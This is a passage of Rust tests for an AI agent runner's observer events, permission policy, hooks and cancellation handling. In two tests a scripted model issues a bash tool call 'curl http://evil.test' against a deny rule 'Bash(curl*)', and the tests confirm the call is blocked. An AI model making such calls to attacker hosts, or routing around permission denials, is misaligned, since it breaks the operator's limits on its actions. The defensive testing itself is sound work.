            Some(EventKind::Error { .. })
        ));
    }

    #[tokio::test]
    async fn completion_failure_closes_thinking_with_error() {
        let observer = Arc::new(CollectingObserver::default());
        let runner =
            AgentRunner::new(ErrModel, ToolRegistry::new()).with_observer(observer.clone());
        let mut session = AgentSession::new();

        let err = runner
            .run_turn(&mut session, "go")
            .await
            .expect_err("the model fails");
        assert!(matches!(err, AgentError::Completion(_)));

        let events = observer.events();
        let kinds: Vec<_> = events.iter().map(|e| event_label(&e.kind)).collect();
        // ModelStart's "thinking" state is closed by the Error, with no
        // intervening Assistant.
        assert_eq!(kinds, vec!["model_start", "error"]);
        assert!(matches!(
            &events[1].kind,
            EventKind::Error { kind, .. } if kind == "completion"
        ));
    }

    #[tokio::test]
    async fn harness_tool_error_is_honestly_ended_then_turn_errors() {
        let model = FakeModel::new([response_many(vec![
            AssistantContent::tool_call("call_1", "broken", serde_json::json!({})),
            AssistantContent::tool_call("call_2", "broken", serde_json::json!({})),
        ])]);
        let mut registry = ToolRegistry::new();
        registry.register(BrokenTool::new());
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(model, registry).with_observer(observer.clone());
        let mut session = AgentSession::new();

        let err = runner
            .run_turn(&mut session, "break it")
            .await
            .expect_err("a harness tool error unwinds the turn");
        assert!(matches!(err, AgentError::Tool { .. }));

        let events = observer.events();
        let tool_ends: Vec<_> = events
            .iter()
            .filter_map(|e| match &e.kind {
                EventKind::ToolEnd {
                    tool_call_id,
                    error,
                    ..
                } => Some((
                    tool_call_id.clone(),
                    error.as_ref().map(|f| f.kind.to_string()),
                )),
                _ => None,
            })
            .collect();
        // call_1 actually ran and failed → honest "tool_error"; call_2 never ran
        // → "cancelled".
        assert_eq!(
            tool_ends,
            vec![
                ("call_1".to_string(), Some("tool_error".to_string())),
                ("call_2".to_string(), Some("cancelled".to_string())),
            ],
        );
        // The transcript result mirrors the ToolEnd's honest failure.
        assert!(tool_result_text(&session, 2).contains("tool_error"));

        let errors: Vec<_> = events
            .iter()
            .filter(|e| matches!(e.kind, EventKind::Error { .. }))
            .collect();
        assert_eq!(errors.len(), 1);
        assert!(matches!(
            &errors[0].kind,
            EventKind::Error { kind, .. } if kind == "tool"
        ));
    }

    #[tokio::test]
    async fn unknown_tool_emits_tool_end_without_tool_start() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "ghost",
                serde_json::json!({}),
            )),
            response(AssistantContent::text("ok")),
        ]);
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(model, ToolRegistry::new()).with_observer(observer.clone());
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "call a ghost")
            .await
            .expect("an unknown tool is model-recoverable");

        let events = observer.events();
        // The tool never resolved, so it gets a ToolEnd with no ToolStart.
        assert!(
            !events
                .iter()
                .any(|e| matches!(e.kind, EventKind::ToolStart { .. }))
        );
        let tool_ends: Vec<_> = events
            .iter()
            .filter(|e| matches!(e.kind, EventKind::ToolEnd { .. }))
            .collect();
        assert_eq!(tool_ends.len(), 1);
        assert!(matches!(
            &tool_ends[0].kind,
            EventKind::ToolEnd { ok: false, error: Some(f), .. } if f.kind.as_str() == "unknown_tool"
        ));
    }

    #[tokio::test]
    async fn permission_denied_emits_failed_tool_end_after_start() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "curl http://evil.test" }),
            )),
            response(AssistantContent::text("understood")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let mut policy = PermissionPolicy::new();
        policy
            .deny
            .extend(parse_rule("Bash(curl*)", RuleOrigin::ProjectSettings).unwrap());
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(model, registry)
            .with_policy(policy)
            .with_observer(observer.clone());
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "fetch the script")
            .await
            .expect("a denial is model-recoverable");

        let events = observer.events();
        // The request was computed, so ToolStart fires before the deny verdict.
        assert!(events.iter().any(|e| matches!(
            &e.kind,
            EventKind::ToolStart { tool_call_id, .. } if tool_call_id == "call_1"
        )));
        let tool_ends: Vec<_> = events
            .iter()
            .filter_map(|e| match &e.kind {
                EventKind::ToolEnd { error, .. } => Some(error.clone()),
                _ => None,
            })
            .collect();
        assert_eq!(tool_ends.len(), 1);
        assert!(matches!(&tool_ends[0], Some(f) if f.kind.as_str() == "permission_denied"));
    }

    #[tokio::test]
    async fn composite_observer_isolates_a_panicking_observer() {
        let model = FakeModel::new([response(AssistantContent::text("done"))]);
        let collecting = Arc::new(CollectingObserver::default());
        let composite = CompositeObserver(vec![
            Arc::new(PanicObserver) as Arc<dyn AgentObserver>,
            collecting.clone(),
        ]);
        let runner =
            AgentRunner::new(model, ToolRegistry::new()).with_observer(Arc::new(composite));
        let mut session = AgentSession::new();

        let turn = runner
            .run_turn(&mut session, "go")
            .await
            .expect("a panicking observer must not unwind the turn");
        assert_eq!(turn.final_text(&session), "done");

        // The healthy observer still received the full stream.
        let kinds: Vec<_> = collecting
            .events()
            .iter()
            .map(|e| event_label(&e.kind))
            .collect();
        assert_eq!(kinds, vec!["model_start", "assistant"]);
    }

    #[tokio::test]
    async fn bare_panicking_observer_does_not_unwind_the_runner() {
        // A bare (non-composite) observer has no isolation of its own, so a
        // surviving turn proves `emit` itself swallows the panic — a rendering
        // frontend must never be able to crash the agent loop.
        let model = FakeModel::new([response(AssistantContent::text("done"))]);
        let runner =
            AgentRunner::new(model, ToolRegistry::new()).with_observer(Arc::new(PanicObserver));
        let mut session = AgentSession::new();

        let turn = runner
            .run_turn(&mut session, "go")
            .await
            .expect("a panicking bare observer must not unwind the turn");
        assert_eq!(turn.final_text(&session), "done");
    }

    #[tokio::test]
    async fn pre_iteration_error_carries_no_iteration() {
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::with_config(
            FakeModel::default(),
            ToolRegistry::new(),
            AgentConfig {
                max_iterations: 0,
                ..AgentConfig::default()
            },
        )
        .with_observer(observer.clone());
        let mut session = AgentSession::new();

        let err = runner
            .run_turn(&mut session, "go")
            .await
            .expect_err("a zero iteration budget cannot complete");
        assert!(matches!(err, AgentError::MaxIterations { .. }));

        let events = observer.events();
        // The model was never called, so the only event is the terminal Error,
        // which has no owning model call — `iteration` is `None`, not `Some(0)`.
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].iteration, None);
        assert!(matches!(
            &events[0].kind,
            EventKind::Error { kind, .. } if kind == "max_iterations"
        ));
    }

    #[tokio::test]
    async fn empty_transcript_error_carries_no_iteration() {
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(FakeModel::default(), ToolRegistry::new())
            .with_observer(observer.clone());
        let mut session = AgentSession::new();

        let err = runner
            .continue_session(&mut session)
            .await
            .expect_err("an empty transcript is invalid");
        assert!(matches!(err, AgentError::EmptyTranscript));

        let events = observer.events();
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].iteration, None);
        assert!(matches!(
            &events[0].kind,
            EventKind::Error { kind, .. } if kind == "empty_transcript"
        ));
    }

    /// Counts `PostToolUse` invocations, to prove it does (not) fire.
    struct CountingPostHook(Arc<AtomicUsize>);

    #[async_trait]
    impl Hook for CountingPostHook {
        async fn post_tool_use(&self, _cx: &PostToolCx<'_>) -> PostToolOutcome {
            self.0.fetch_add(1, Ordering::SeqCst);
            PostToolOutcome::Proceed
        }
    }

    /// Cancels the turn from inside `pre_tool_use`, then hangs — the hook analogue
    /// of `HangTool`, driving the trigger's `select!` to its cancel branch.
    struct CancelInPreHook(CancellationToken);

    #[async_trait]
    impl Hook for CancelInPreHook {
        async fn pre_tool_use(&self, _cx: &PreToolCx<'_>) -> PreToolOutcome {
            self.0.cancel();
            std::future::pending().await
        }
    }

    /// Same, but on `post_tool_use` — fires after the current tool's result is
    /// recorded, exercising the mid-batch cancellation path.
    struct CancelInPostHook(CancellationToken);

    #[async_trait]
    impl Hook for CancelInPostHook {
        async fn post_tool_use(&self, _cx: &PostToolCx<'_>) -> PostToolOutcome {
            self.0.cancel();
            std::future::pending().await
        }
    }

    /// Always forces a continuation — the runner's cap, not the hook, must stop it.
    struct AlwaysContinueHook;

    #[async_trait]
    impl Hook for AlwaysContinueHook {
        async fn stop(&self, _cx: &StopCx<'_>) -> StopOutcome {
            StopOutcome::Continue {
                message: "keep going".to_string(),
            }
        }
    }

    /// Text of the plain user message at `index`, if it is one.
    fn user_text(session: &AgentSession, index: usize) -> Option<String> {
        match &session.messages()[index] {
            Message::User { content } => match content.first() {
                UserContent::Text(text) => Some(text.text_ref().to_string()),
                UserContent::ToolResult(_) => None,
            },
            _ => None,
        }
    }

    /// Whether the message at `index` is a tool-result user message.
    fn is_tool_result(session: &AgentSession, index: usize) -> bool {
        matches!(
            &session.messages()[index],
            Message::User { content } if matches!(content.first(), UserContent::ToolResult(_))
        )
    }

    /// Whether any message in a request's history is a user text equal to `text`.
    fn request_has_user_text(request: &CompletionRequest, text: &str) -> bool {
        request.chat_history.iter().any(|message| {
            matches!(
                message,
                Message::User { content }
                    if matches!(content.first(), UserContent::Text(t) if t.text_ref() == text)
            )
        })
    }

    #[tokio::test]
    async fn pre_tool_use_deny_short_circuits_the_gate() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "printf hi" }),
            )),
            response(AssistantContent::text("understood")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let observer = Arc::new(CollectingObserver::default());
        // A scripted approver with no outcomes panics if consulted, proving the
        // hook deny short-circuits before the gate reaches the approver.
        let runner = AgentRunner::new(model, registry)
            .with_approver(Arc::new(ScriptedApprover::new([])))
            .with_observer(observer.clone())
            .with_hook(Arc::new(ScriptedHook::default().deny_tool("bash")));
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "run it")
            .await
            .expect("a hook denial is model-recoverable");

        let result = tool_result_text(&session, 2);
        assert!(result.contains("blocked_by_hook"), "got {result}");

        // Same event shape as a permission denial: ToolStart, then a failed ToolEnd.
        let events = observer.events();
        assert!(
            events
                .iter()
                .any(|e| matches!(&e.kind, EventKind::ToolStart { .. }))
        );
        let tool_ends: Vec<_> = events
            .iter()
            .filter_map(|e| match &e.kind {
                EventKind::ToolEnd { error, .. } => Some(error.clone()),
                _ => None,
            })
            .collect();
        assert_eq!(tool_ends.len(), 1);
        assert!(matches!(&tool_ends[0], Some(f) if f.kind.as_str() == "blocked_by_hook"));
    }

    #[tokio::test]
    async fn hook_proceed_does_not_bypass_a_gate_deny() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "curl http://evil.test" }),
            )),
            response(AssistantContent::text("ok")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let mut policy = PermissionPolicy::new();
        policy
            .deny
            .extend(parse_rule("Bash(curl*)", RuleOrigin::ProjectSettings).unwrap());
        // A hook that only proceeds must not turn a gate deny into an allow.
        let runner = AgentRunner::new(model, registry)
            .with_policy(policy)
            .with_hook(Arc::new(ScriptedHook::default()));
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "fetch")
            .await
            .expect("a denial is model-recoverable");
        let result = tool_result_text(&session, 2);
        assert!(result.contains("permission_denied"), "got {result}");
    }

    #[tokio::test]
    async fn user_prompt_submit_add_context_reaches_the_model() {
        let model = FakeModel::new([response(AssistantContent::text("done"))]);
        let runner = AgentRunner::new(model.clone(), ToolRegistry::new())
            .with_hook(Arc::new(ScriptedHook::default().add_context("INJECTED")));
        let mut session = AgentSession::new();

        runner.run_turn(&mut session, "hi").await.expect("runs");

        // Prompt then injected context, in order; and the model saw the context.
        assert_eq!(user_text(&session, 0).as_deref(), Some("hi"));
        assert_eq!(user_text(&session, 1).as_deref(), Some("INJECTED"));
        assert!(request_has_user_text(&model.requests()[0], "INJECTED"));
    }

    #[tokio::test]
    async fn user_prompt_submit_block_leaves_no_trace() {
        let model = FakeModel::new([response(AssistantContent::text("unreached"))]);
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(model.clone(), ToolRegistry::new())
            .with_observer(observer.clone())
            .with_hook(Arc::new(ScriptedHook::default().block("not allowed")));
        let mut session = AgentSession::new();

        let err = runner
            .run_turn(&mut session, "secret")
            .await
            .expect_err("the prompt is blocked");
        assert!(matches!(err, AgentError::PromptBlocked { reason } if reason == "not allowed"));

        // Nothing entered the transcript and the model was never called.
        assert!(session.messages().is_empty());
        assert!(model.requests().is_empty());

        // The block is still visible to the observer as the turn-terminal error.
        let events = observer.events();
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].iteration, None);
        assert!(matches!(
            &events[0].kind,
            EventKind::Error { kind, .. } if kind == "prompt_blocked"
        ));
    }

    #[tokio::test]
    async fn post_tool_use_feedback_lands_after_the_batch() {
        let model = FakeModel::new([
            response_many(vec![
                AssistantContent::tool_call(
                    "call_1",
                    "bash",
                    serde_json::json!({ "cmd": "printf one" }),
                ),
                AssistantContent::tool_call(
                    "call_2",
                    "bash",
                    serde_json::json!({ "cmd": "printf two" }),
                ),
            ]),
            response(AssistantContent::text("done")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let runner = AgentRunner::new(model, registry)
            .with_hook(Arc::new(ScriptedHook::default().add_feedback("FB")));
        let mut session = AgentSession::new();

        runner.run_turn(&mut session, "do two").await.expect("runs");

        // The two tool_results stay contiguous; feedback follows the batch.
        assert!(is_tool_result(&session, 2));
        assert!(is_tool_result(&session, 3));
        assert!(!is_tool_result(&session, 4));
        assert_eq!(tool_result_id(&session, 2), "call_1");
        assert_eq!(tool_result_id(&session, 3), "call_2");
        assert_eq!(user_text(&session, 4).as_deref(), Some("FB"));
    }

    #[tokio::test]
    async fn post_tool_use_does_not_fire_on_a_harness_error() {
        let model = FakeModel::new([response(AssistantContent::tool_call(
            "call_1",
            "broken",
            serde_json::json!({}),
        ))]);
        let mut registry = ToolRegistry::new();
        registry.register(BrokenTool::new());
        let count = Arc::new(AtomicUsize::new(0));
        let runner =
            AgentRunner::new(model, registry).with_hook(Arc::new(CountingPostHook(count.clone())));
        let mut session = AgentSession::new();

        let err = runner
            .run_turn(&mut session, "break")
            .await
            .expect_err("a harness tool error unwinds the turn");
        assert!(matches!(err, AgentError::Tool { .. }));
        assert_eq!(
            count.load(Ordering::SeqCst),
            0,
            "PostToolUse must not fire on a harness-boundary AgentError::Tool",
        );
    }

    #[tokio::test]
    async fn post_tool_use_cancellation_keeps_results_paired() {
        let model = FakeModel::new([response_many(vec![
            AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "printf one" }),
            ),
            AssistantContent::tool_call(
                "call_2",
                "bash",
                serde_json::json!({ "cmd": "printf two" }),
            ),
        ])]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let cancel = CancellationToken::new();
        let runner =
            AgentRunner::new(model, registry).with_hook(Arc::new(CancelInPostHook(cancel.clone())));
        let mut session = AgentSession::new();

        let err = runner
            .run_turn_with(&mut session, "do two", cancel)
            .await
            .expect_err("the hook cancels the turn");
        assert!(matches!(err, AgentError::Cancelled));

        // call_1 ran and was recorded exactly once (real output); call_2 is paired
        // as interrupted — the invariant holds with no duplicate for call_1.
        assert_eq!(session.messages().len(), 4);
        assert_eq!(tool_result_id(&session, 2), "call_1");
        assert!(tool_result_text(&session, 2).contains("\"stdout\":\"one\""));
        assert_eq!(tool_result_id(&session, 3), "call_2");
        assert!(tool_result_text(&session, 3).contains("cancelled"));
    }

    #[tokio::test]
    async fn stop_continue_forces_more_iterations_then_allows() {
        let model = FakeModel::new([
            response(AssistantContent::text("a")),
            response(AssistantContent::text("b")),
            response(AssistantContent::text("done")),
        ]);
        let runner = AgentRunner::new(model, ToolRegistry::new()).with_hook(Arc::new(
            ScriptedHook::default().stop_continue(2, "keep going"),
        ));
        let mut session = AgentSession::new();

        let turn = runner
            .run_turn(&mut session, "go")
            .await
            .expect("completes after the scripted continuations");
        assert_eq!(turn.iterations, 3);
        assert_eq!(turn.final_text(&session), "done");
    }

    #[tokio::test]
    async fn stop_continue_is_ignored_without_iteration_budget() {
        // The last allowed model call returns a final answer; a hook wants to
        // continue but there is no budget, so the answer stands rather than
        // turning into a MaxIterations error.
        let model = FakeModel::new([response(AssistantContent::text("final"))]);
        let runner = AgentRunner::with_config(
            model,
            ToolRegistry::new(),
            AgentConfig {
                max_iterations: 1,
                ..AgentConfig::default()
            },
        )
        .with_hook(Arc::new(ScriptedHook::default().stop_continue(5, "more")));
        let mut session = AgentSession::new();

        let turn = runner
            .run_turn(&mut session, "go")
            .await
            .expect("the final answer is kept, not turned into MaxIterations");
        assert_eq!(turn.iterations, 1);
        assert_eq!(turn.final_text(&session), "final");
    }

    #[tokio::test]
    async fn stop_continuation_cap_resets_each_turn() {
        // An always-continue hook: the runner's cap (a run_loop local), not the
        // hook, stops it — so each turn gets a fresh budget of continuations. If
        // the cap lived on the session, turn B would stop after one iteration.
        let model = FakeModel::new([
            response(AssistantContent::text("a0")),
            response(AssistantContent::text("a1")),
            response(AssistantContent::text("a2")),
            response(AssistantContent::text("a3")),
            response(AssistantContent::text("b0")),
            response(AssistantContent::text("b1")),
            response(AssistantContent::text("b2")),
            response(AssistantContent::text("b3")),
        ]);
        let runner =
            AgentRunner::new(model, ToolRegistry::new()).with_hook(Arc::new(AlwaysContinueHook));
        let mut session = AgentSession::new();

        let turn_a = runner
            .run_turn(&mut session, "first")
            .await
            .expect("turn A");
        assert_eq!(turn_a.iterations, 4);

        let turn_b = runner
            .run_turn(&mut session, "second")
            .await
            .expect("turn B");
        assert_eq!(turn_b.iterations, 4);
    }

    #[tokio::test]
    async fn hook_cancellation_is_not_a_model_visible_deny() {
        let model = FakeModel::new([response(AssistantContent::tool_call(
            "call_1",
            "bash",
            serde_json::json!({ "cmd": "printf hi" }),
        ))]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let cancel = CancellationToken::new();
        let runner =
            AgentRunner::new(model, registry).with_hook(Arc::new(CancelInPreHook(cancel.clone())));
        let mut session = AgentSession::new();

        let err = runner
            .run_turn_with(&mut session, "run", cancel)
            .await
            .expect_err("the hook cancels the turn");
        assert!(matches!(err, AgentError::Cancelled));

        // The call is paired as interrupted ("cancelled"), never a blocked_by_hook
        // deny — a user cancel must not be mistaken for a hook decision.
        let result = tool_result_text(&session, 2);
        assert!(result.contains("cancelled"), "got {result}");
        assert!(
            !result.contains("blocked_by_hook"),
            "cancellation was mis-mapped to a deny: {result}"
        );
    }
}
